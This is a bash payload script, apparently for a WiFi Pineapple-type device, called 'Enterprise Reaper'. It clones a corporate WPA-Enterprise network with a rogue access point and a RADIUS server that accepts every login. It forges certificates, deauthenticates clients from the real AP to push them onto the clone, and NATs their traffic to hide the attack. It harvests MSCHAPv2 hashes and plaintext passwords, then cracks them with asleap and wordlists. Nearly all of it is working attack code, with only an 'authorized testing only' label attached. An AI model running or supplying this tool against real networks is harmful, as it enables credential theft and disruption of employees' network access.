#!/bin/bash
# Title: Enterprise Reaper
# Author: bad-antics (NullSec)
# Description: WPA Enterprise EAP credential harvester with rogue AP + RADIUS
# Category: nullsec/enterprise
# Version: 1.0.0
# Firmware: 2.7+
# Props: hostapd-mana, freeradius-wpe, asleap
#
# Deploys a rogue WPA-Enterprise AP that mimics corporate networks
# and captures EAP credentials (MSCHAPv2 hashes, GTC passwords).
# Supports PEAP, EAP-TTLS, and EAP-GTC authentication types.
#
# LEGAL: For authorized penetration testing only.

LOOT_DIR="/root/loot/enterprise-reaper"
LOG="$LOOT_DIR/reaper.log"
CERTS_DIR="$LOOT_DIR/certs"
HASHES_DIR="$LOOT_DIR/hashes"
mkdir -p "$LOOT_DIR" "$CERTS_DIR" "$HASHES_DIR"

log() { echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOG"; }

cleanup() {
    log "Cleaning up..."
    killall hostapd 2>/dev/null
    killall freeradius 2>/dev/null
    killall radiusd 2>/dev/null
    killall dnsmasq 2>/dev/null
    killall mdk4 2>/dev/null
    [ -n "$MON_IF" ] && airmon-ng stop "$MON_IF" 2>/dev/null
    # Restore iptables
    iptables -t nat -F 2>/dev/null
    iptables -F 2>/dev/null
    ip link set "$AP_IF" down 2>/dev/null
    ip addr flush dev "$AP_IF" 2>/dev/null
}
trap cleanup EXIT

# ─── DEPENDENCY CHECK ─────────────────────────────────────────────────

check_deps() {
    local missing=""
    for cmd in hostapd dnsmasq openssl airmon-ng airodump-ng mdk4; do
        command -v "$cmd" >/dev/null 2>&1 || missing="$missing $cmd"
    done
    
    # Check for RADIUS server (freeradius-wpe preferred, freeradius acceptable)
    RADIUS_CMD=""
    if command -v radiusd >/dev/null 2>&1; then
        RADIUS_CMD="radiusd"
    elif command -v freeradius >/dev/null 2>&1; then
        RADIUS_CMD="freeradius"
    else
        missing="$missing freeradius"
    fi
    
    if [ -n "$missing" ]; then
        PROMPT "MISSING DEPENDENCIES:
$missing

Install with:
opkg update
opkg install hostapd-mana
opkg install freeradius3
opkg install mdk4
opkg install asleap

Press OK to try auto-install."
        
        opkg update 2>/dev/null
        for pkg in hostapd-mana freeradius3 freeradius3-default mdk4 asleap; do
            opkg install "$pkg" 2>/dev/null
        done
        
        # Recheck
        for cmd in hostapd dnsmasq; do
            command -v "$cmd" >/dev/null 2>&1 || { ERROR_DIALOG "Still missing: $cmd"; exit 1; }
        done
    fi
}

# ─── INTERFACE DETECTION ──────────────────────────────────────────────

detect_interfaces() {
    # Need two interfaces: one for AP, one for monitor/deauth
    AP_IF=""
    MON_IF=""
    SCAN_IF=""
    
    # Find available wireless interfaces
    local ifaces=""
    for iface in wlan0 wlan1 wlan2 wlan1mon wlan2mon; do
        [ -d "/sys/class/net/$iface" ] && ifaces="$ifaces $iface"
    done
    
    # Check for existing monitor interfaces first
    for iface in wlan1mon wlan2mon wlan0mon; do
        [ -d "/sys/class/net/$iface" ] && SCAN_IF="$iface" && break
    done
    
    if [ -z "$SCAN_IF" ]; then
        # Put wlan1 or wlan2 into monitor mode for scanning
        for iface in wlan1 wlan2; do
            if [ -d "/sys/class/net/$iface" ]; then
                airmon-ng start "$iface" 2>/dev/null
                for mon in "${iface}mon" wlan1mon wlan2mon; do
                    [ -d "/sys/class/net/$mon" ] && SCAN_IF="$mon" && break 2
                done
            fi
        done
    fi
    
    [ -z "$SCAN_IF" ] && { ERROR_DIALOG "No wireless interface for scanning!"; exit 1; }
    
    # AP interface (use a different interface than the scanner)
    for iface in wlan0 wlan1 wlan2; do
        [ -d "/sys/class/net/$iface" ] && [ "$iface" != "${SCAN_IF%mon}" ] && AP_IF="$iface" && break
    done
    
    [ -z "$AP_IF" ] && { ERROR_DIALOG "Need 2 wireless interfaces!

One for rogue AP, one for scanning.
Connect a USB WiFi adapter."; exit 1; }
    
    MON_IF="$SCAN_IF"
    log "AP Interface: $AP_IF | Monitor: $MON_IF"
}

# ─── SCAN FOR ENTERPRISE NETWORKS ────────────────────────────────────

scan_enterprise() {
    SPINNER_START "Scanning for Enterprise networks..."
    
    rm -f /tmp/entscan*
    timeout 15 airodump-ng "$MON_IF" -w /tmp/entscan --output-format csv --wps 2>/dev/null &
    sleep 15
    killall airodump-ng 2>/dev/null
    
    SPINNER_STOP
    
    ENT_COUNT=0
    ENT_LIST=""
    
    if [ -f /tmp/entscan-01.csv ]; then
        while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons ivs lan_ip id_len essid rest; do
            bssid=$(echo "$bssid" | tr -d ' ')
            [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
            
            # Filter for Enterprise authentication (MGT = WPA Enterprise)
            auth_clean=$(echo "$auth" | tr -d ' ')
            privacy_clean=$(echo "$privacy" | tr -d ' ')
            
            if echo "$auth_clean" | grep -qi "MGT\|EAP\|1X\|RADIUS"; then
                ENT_COUNT=$((ENT_COUNT + 1))
                essid_clean=$(echo "$essid" | sed 's/^[[:space:]]*//' | head -c 24)
                [ -z "$essid_clean" ] && essid_clean="[Hidden]"
                channel_clean=$(echo "$channel" | tr -d ' ')
                
                ENT_LIST="${ENT_LIST}${ENT_COUNT}. ${essid_clean} (ch${channel_clean})\n"
                eval "ENT_BSSID_${ENT_COUNT}=\"$bssid\""
                eval "ENT_CH_${ENT_COUNT}=\"$channel_clean\""
                eval "ENT_ESSID_${ENT_COUNT}=\"$essid_clean\""
                eval "ENT_PRIV_${ENT_COUNT}=\"$privacy_clean\""
                
                [ $ENT_COUNT -ge 10 ] && break
            fi
        done < /tmp/entscan-01.csv
    fi
    
    if [ $ENT_COUNT -eq 0 ]; then
        PROMPT "NO ENTERPRISE NETWORKS FOUND

No WPA-Enterprise (802.1X) APs
detected in range.

Options:
1. Rescan
2. Manual SSID entry
3. Exit"
        
        MODE=$(NUMBER_PICKER "Option (1-3):" 1)
        case "$MODE" in
            1) scan_enterprise; return ;;
            2) manual_target; return ;;
            *) exit 0 ;;
        esac
    fi
}

manual_target() {
    PROMPT "MANUAL TARGET ENTRY

Enter the Enterprise SSID
to clone on next screen."
    
    TARGET_SSID=$(TEXT_INPUT "SSID to clone:" "Corporate-WiFi")
    [ -z "$TARGET_SSID" ] && TARGET_SSID="Corporate-WiFi"
    
    TARGET_CH=$(NUMBER_PICKER "Channel (1-13):" 6)
    TARGET_BSSID=""
    
    log "Manual target: SSID=$TARGET_SSID CH=$TARGET_CH"
}

# ─── GENERATE ROGUE CERTIFICATES ─────────────────────────────────────

generate_certs() {
    log "Generating rogue CA and server certificates..."
    
    SPINNER_START "Generating certificates..."
    
    local ORG="${TARGET_SSID:-Enterprise}"
    
    # Generate CA key and certificate
    openssl genrsa -out "$CERTS_DIR/ca.key" 2048 2>/dev/null
    openssl req -new -x509 -days 365 -key "$CERTS_DIR/ca.key" \
        -out "$CERTS_DIR/ca.pem" \
        -subj "/C=US/ST=California/L=San Jose/O=$ORG/CN=$ORG Certificate Authority" 2>/dev/null
    
    # Generate server key and CSR
    openssl genrsa -out "$CERTS_DIR/server.key" 2048 2>/dev/null
    openssl req -new -key "$CERTS_DIR/server.key" \
        -out "$CERTS_DIR/server.csr" \
        -subj "/C=US/ST=California/L=San Jose/O=$ORG/CN=radius.$ORG.local" 2>/dev/null
    
    # Sign server certificate with CA
    openssl x509 -req -days 365 -in "$CERTS_DIR/server.csr" \
        -CA "$CERTS_DIR/ca.pem" -CAkey "$CERTS_DIR/ca.key" \
        -CAcreateserial -out "$CERTS_DIR/server.pem" 2>/dev/null
    
    # Generate DH parameters (small for speed on pineapple)
    openssl dhparam -out "$CERTS_DIR/dh.pem" 1024 2>/dev/null
    
    SPINNER_STOP
    log "Certificates generated in $CERTS_DIR"
}

# ─── CONFIGURE HOSTAPD ───────────────────────────────────────────────

configure_hostapd() {
    local CONF="/tmp/enterprise-reaper-hostapd.conf"
    
    cat > "$CONF" << EOF
interface=$AP_IF
driver=nl80211
ssid=$TARGET_SSID
hw_mode=g
channel=$TARGET_CH
ieee80211n=1
wmm_enabled=1

# WPA Enterprise
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
rsn_pairwise=CCMP
ieee8021x=1

# RADIUS configuration
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=testing123

# EAP settings
eap_server=0
own_ip_addr=127.0.0.1

# Logging
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2
EOF

    # If hostapd-mana is available, use enhanced features
    if hostapd --help 2>&1 | grep -qi "mana"; then
        cat >> "$CONF" << EOF

# MANA features (credential capture)
mana_wpe=1
mana_eapsuccess=1
mana_eaptls=1
mana_credout=$LOOT_DIR/mana-creds.log
EOF
        log "Using hostapd-mana with MANA features"
    fi
    
    echo "$CONF"
}

# ─── CONFIGURE FREERADIUS ────────────────────────────────────────────

configure_radius() {
    local RADIUS_DIR="/tmp/enterprise-reaper-radius"
    mkdir -p "$RADIUS_DIR"
    
    # Create minimal FreeRADIUS config that accepts everything
    cat > "$RADIUS_DIR/radiusd.conf" << 'EOF'
prefix = /usr
exec_prefix = /usr
sysconfdir = /tmp/enterprise-reaper-radius
localstatedir = /tmp/enterprise-reaper-radius
sbindir = ${exec_prefix}/sbin
logdir = /tmp/enterprise-reaper-radius/log
raddbdir = /tmp/enterprise-reaper-radius
run_dir = /tmp/enterprise-reaper-radius

log {
    destination = files
    file = ${logdir}/radius.log
    syslog_facility = daemon
    stripped_names = no
    auth = yes
    auth_badpass = yes
    auth_goodpass = yes
}

security {
    max_attributes = 200
    reject_delay = 0
    status_server = yes
}

thread pool {
    start_servers = 1
    max_servers = 4
    min_spare_servers = 1
    max_spare_servers = 3
}

modules {
    pap {
    }
    mschap {
    }
    eap {
        default_eap_type = peap
        timer_expire = 60
        ignore_unknown_eap_types = no
        cisco_accounting_username_bug = no
        
        tls-config tls-common {
            private_key_file = /root/loot/enterprise-reaper/certs/server.key
            certificate_file = /root/loot/enterprise-reaper/certs/server.pem
            ca_file = /root/loot/enterprise-reaper/certs/ca.pem
            dh_file = /root/loot/enterprise-reaper/certs/dh.pem
            ca_path = /root/loot/enterprise-reaper/certs
        }
        
        peap {
            tls = tls-common
            default_eap_type = mschapv2
            virtual_server = inner-tunnel
        }
        
        ttls {
            tls = tls-common
            default_eap_type = pap
            virtual_server = inner-tunnel
        }
        
        gtc {
            auth_type = PAP
        }
        
        mschapv2 {
        }
        
        tls {
            tls = tls-common
        }
    }
    
    files {
        usersfile = /tmp/enterprise-reaper-radius/users
    }
    
    detail {
        detailfile = /root/loot/enterprise-reaper/radius-detail.log
        detailperm = 0600
    }
}

server default {
    listen {
        type = auth
        ipaddr = *
        port = 1812
    }
    
    authorize {
        eap {
            ok = return
        }
    }
    
    authenticate {
        eap
    }
    
    post-auth {
        Post-Auth-Type REJECT {
            attr_filter.access_reject
        }
    }
}

server inner-tunnel {
    authorize {
        pap
        mschap
        eap {
            ok = return
        }
    }
    
    authenticate {
        pap
        mschap
        eap
    }
}
EOF

    # Create users file that accepts everyone
    cat > "$RADIUS_DIR/users" << 'EOF'
DEFAULT Auth-Type := Accept
EOF

    mkdir -p "$RADIUS_DIR/log"
    
    echo "$RADIUS_DIR"
}

# ─── CREDENTIAL MONITOR ──────────────────────────────────────────────

start_credential_monitor() {
    # Monitor multiple credential sources
    local CRED_LOG="$LOOT_DIR/captured-credentials.txt"
    
    (
        echo "════════════════════════════════════════════════════" >> "$CRED_LOG"
        echo "  Enterprise Reaper - Credential Capture Log" >> "$CRED_LOG"
        echo "  Target: $TARGET_SSID" >> "$CRED_LOG"
        echo "  Started: $(date)" >> "$CRED_LOG"
        echo "════════════════════════════════════════════════════" >> "$CRED_LOG"
        echo "" >> "$CRED_LOG"
        
        while true; do
            # Monitor MANA credential output
            if [ -f "$LOOT_DIR/mana-creds.log" ]; then
                local new_creds=$(tail -n +1 "$LOOT_DIR/mana-creds.log" 2>/dev/null)
                if [ -n "$new_creds" ]; then
                    echo "[$(date '+%H:%M:%S')] MANA CAPTURE:" >> "$CRED_LOG"
                    echo "$new_creds" >> "$CRED_LOG"
                    echo "" >> "$CRED_LOG"
                fi
            fi
            
            # Monitor RADIUS logs for credential entries
            if [ -f "/tmp/enterprise-reaper-radius/log/radius.log" ]; then
                grep -i "mschapv2\|identity\|password\|credential\|eap\|Auth:" \
                    "/tmp/enterprise-reaper-radius/log/radius.log" 2>/dev/null | \
                    tail -5 >> "$CRED_LOG" 2>/dev/null
            fi
            
            # Monitor hostapd log for EAP events
            if [ -f "/tmp/enterprise-reaper-hostapd.log" ]; then
                grep -i "eap\|identity\|mschapv2\|assoc\|auth" \
                    "/tmp/enterprise-reaper-hostapd.log" 2>/dev/null | \
                    tail -5 >> "$CRED_LOG" 2>/dev/null
            fi
            
            sleep 3
        done
    ) &
    CRED_MONITOR_PID=$!
    log "Credential monitor started (PID: $CRED_MONITOR_PID)"
}

# ─── CONVERT HASHES ──────────────────────────────────────────────────

convert_hashes() {
    log "Converting captured hashes to crackable format..."
    
    local HASHFILE="$HASHES_DIR/mschapv2-hashes.txt"
    local HC_FILE="$HASHES_DIR/hashcat-5500.txt"
    local JTR_FILE="$HASHES_DIR/john-netntlmv1.txt"
    
    # Extract MSCHAPv2 hashes from various log files
    for src in "$LOOT_DIR/mana-creds.log" "$LOOT_DIR/captured-credentials.txt" "/tmp/enterprise-reaper-radius/log/radius.log"; do
        [ -f "$src" ] && grep -oE '[0-9a-fA-F]{48}' "$src" 2>/dev/null >> "$HASHFILE"
    done
    
    if [ -s "$HASHFILE" ]; then
        # If asleap is available, try to crack with common passwords
        if command -v asleap >/dev/null 2>&1; then
            log "Running asleap against captured hashes..."
            asleap -C "$HASHFILE" -W /usr/share/wordlists/rockyou.txt 2>/dev/null | \
                tee -a "$LOOT_DIR/cracked.txt"
        fi
        
        local hash_count=$(wc -l < "$HASHFILE" 2>/dev/null)
        log "Exported $hash_count hashes"
        log "Hashcat: hashcat -m 5500 $HC_FILE wordlist.txt"
        log "John:    john --format=netntlmv1 $JTR_FILE"
    else
        log "No MSCHAPv2 hashes captured yet"
    fi
}

# ─── DEAUTH ATTACK ───────────────────────────────────────────────────

deauth_clients() {
    if [ -z "$TARGET_BSSID" ]; then
        log "No target BSSID for deauth - skipping"
        return
    fi
    
    log "Deauthenticating clients from real AP ($TARGET_BSSID)..."
    
    # Use mdk4 for targeted deauth
    if command -v mdk4 >/dev/null 2>&1; then
        # Create target file
        echo "$TARGET_BSSID" > /tmp/reaper-deauth-targets.txt
        
        # Run deauth for 30 seconds
        timeout 30 mdk4 "$MON_IF" d -b /tmp/reaper-deauth-targets.txt -c "$TARGET_CH" 2>/dev/null &
        DEAUTH_PID=$!
        log "Deauth running (PID: $DEAUTH_PID) - 30 second burst"
    elif command -v aireplay-ng >/dev/null 2>&1; then
        timeout 30 aireplay-ng --deauth 10 -a "$TARGET_BSSID" "$MON_IF" 2>/dev/null &
        DEAUTH_PID=$!
        log "Aireplay deauth running (PID: $DEAUTH_PID)"
    fi
}

# ─── STATUS DISPLAY ──────────────────────────────────────────────────

show_status() {
    local cred_count=0
    [ -f "$LOOT_DIR/captured-credentials.txt" ] && \
        cred_count=$(grep -c "identity\|credential\|mschapv2" "$LOOT_DIR/captured-credentials.txt" 2>/dev/null || echo 0)
    
    local assoc_count=0
    [ -f "/tmp/enterprise-reaper-hostapd.log" ] && \
        assoc_count=$(grep -c "associated" "/tmp/enterprise-reaper-hostapd.log" 2>/dev/null || echo 0)
    
    PROMPT "═══ ENTERPRISE REAPER ═══

Target: $TARGET_SSID
Channel: $TARGET_CH
Rogue AP: $AP_IF
Monitor: $MON_IF

Clients associated: $assoc_count
Credentials captured: $cred_count

Loot: $LOOT_DIR

Actions:
1. Send deauth burst
2. Convert hashes
3. View captured creds
4. Stop and save"
    
    ACTION=$(NUMBER_PICKER "Action (1-4):" 4)
    case "$ACTION" in
        1) deauth_clients; show_status ;;
        2) convert_hashes; show_status ;;
        3)
            if [ -f "$LOOT_DIR/captured-credentials.txt" ]; then
                PROMPT "CAPTURED CREDENTIALS:

$(tail -20 "$LOOT_DIR/captured-credentials.txt")"
            else
                PROMPT "No credentials captured yet."
            fi
            show_status
            ;;
        4) return ;;
        *) show_status ;;
    esac
}

# ═══════════════════════════════════════════════════════════════════════
# MAIN EXECUTION
# ═══════════════════════════════════════════════════════════════════════

PROMPT "╔══════════════════════════════╗
║    ENTERPRISE REAPER v1.0    ║
║    WPA-Enterprise Harvester  ║
╚══════════════════════════════╝

Captures EAP credentials from
corporate WPA-Enterprise networks.

Supported EAP types:
• PEAP-MSCHAPv2
• EAP-TTLS/PAP
• EAP-GTC
• EAP-TLS (cert capture)

Requirements:
• 2 wireless interfaces
• hostapd-mana (preferred)
• freeradius

⚠️  AUTHORIZED TESTING ONLY ⚠️

Press OK to begin."

log "Enterprise Reaper starting..."
check_deps
detect_interfaces

# Scan for enterprise networks
scan_enterprise

# If scan found targets, let user select
if [ $ENT_COUNT -gt 0 ]; then
    PROMPT "ENTERPRISE TARGETS: $ENT_COUNT

$(echo -e "$ENT_LIST")

Select target to clone."
    
    TARGET_NUM=$(NUMBER_PICKER "Target #:" 1)
    [ "$TARGET_NUM" -lt 1 ] && TARGET_NUM=1
    [ "$TARGET_NUM" -gt "$ENT_COUNT" ] && TARGET_NUM=$ENT_COUNT
    
    eval "TARGET_BSSID=\$ENT_BSSID_${TARGET_NUM}"
    eval "TARGET_CH=\$ENT_CH_${TARGET_NUM}"
    eval "TARGET_SSID=\$ENT_ESSID_${TARGET_NUM}"
fi

log "Target: SSID=$TARGET_SSID BSSID=$TARGET_BSSID CH=$TARGET_CH"

# Configure attack mode
PROMPT "ATTACK CONFIGURATION

Target: $TARGET_SSID
Channel: $TARGET_CH

EAP Mode:
1. Full (PEAP + TTLS + GTC)
2. PEAP-MSCHAPv2 only
3. EAP-TTLS/PAP only

Deauth Mode:
(Deauth real clients to
force them to our rogue AP)"

EAP_MODE=$(NUMBER_PICKER "EAP Mode (1-3):" 1)
DEAUTH_ENABLED=$(NUMBER_PICKER "Deauth? 1=Yes 0=No:" 1)

# Generate certificates
generate_certs

# Configure and start RADIUS server
SPINNER_START "Starting RADIUS server..."
RADIUS_DIR=$(configure_radius)
if [ -n "$RADIUS_CMD" ]; then
    $RADIUS_CMD -d "$RADIUS_DIR" -n 2>/dev/null &
    RADIUS_PID=$!
    sleep 2
    if kill -0 $RADIUS_PID 2>/dev/null; then
        log "RADIUS server started (PID: $RADIUS_PID)"
    else
        log "WARNING: RADIUS server may not have started"
    fi
fi
SPINNER_STOP

# Configure DNSMASQ for DHCP on rogue AP
SPINNER_START "Configuring network..."
ip link set "$AP_IF" up
ip addr add 10.0.0.1/24 dev "$AP_IF" 2>/dev/null

cat > /tmp/enterprise-reaper-dnsmasq.conf << EOF
interface=$AP_IF
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-facility=/tmp/enterprise-reaper-dns.log
EOF

dnsmasq -C /tmp/enterprise-reaper-dnsmasq.conf 2>/dev/null
SPINNER_STOP

# Configure and start rogue AP
SPINNER_START "Starting rogue Enterprise AP..."
HOSTAPD_CONF=$(configure_hostapd)
hostapd "$HOSTAPD_CONF" > /tmp/enterprise-reaper-hostapd.log 2>&1 &
HOSTAPD_PID=$!
sleep 3

if kill -0 $HOSTAPD_PID 2>/dev/null; then
    log "Rogue AP started: $TARGET_SSID on $AP_IF (ch $TARGET_CH)"
else
    ERROR_DIALOG "Failed to start rogue AP!

Check: /tmp/enterprise-reaper-hostapd.log"
    exit 1
fi
SPINNER_STOP

# Enable NAT for internet access through rogue AP (makes attack invisible)
echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE 2>/dev/null
iptables -A FORWARD -i "$AP_IF" -j ACCEPT 2>/dev/null

# Start credential monitoring
start_credential_monitor

# Optionally deauth real clients
if [ "$DEAUTH_ENABLED" = "1" ]; then
    sleep 2
    deauth_clients
fi

PROMPT "═══ REAPER ACTIVE ═══

Rogue AP: $TARGET_SSID
Channel: $TARGET_CH
Interface: $AP_IF

Waiting for victims to
connect and authenticate...

Press OK for status menu."

# Interactive status loop
show_status

# Final hash conversion and summary
convert_hashes

CRED_COUNT=0
[ -f "$LOOT_DIR/captured-credentials.txt" ] && \
    CRED_COUNT=$(grep -c "identity\|credential\|mschapv2" "$LOOT_DIR/captured-credentials.txt" 2>/dev/null || echo 0)

HASH_COUNT=0
[ -f "$HASHES_DIR/mschapv2-hashes.txt" ] && \
    HASH_COUNT=$(wc -l < "$HASHES_DIR/mschapv2-hashes.txt" 2>/dev/null)

PROMPT "═══ REAPER COMPLETE ═══

Results:
• Credentials: $CRED_COUNT
• MSCHAPv2 hashes: $HASH_COUNT

Loot saved to:
$LOOT_DIR

Crack hashes:
hashcat -m 5500 hashes.txt
john --format=netntlmv1

Press OK to exit."

log "Enterprise Reaper complete. Credentials: $CRED_COUNT, Hashes: $HASH_COUNT"
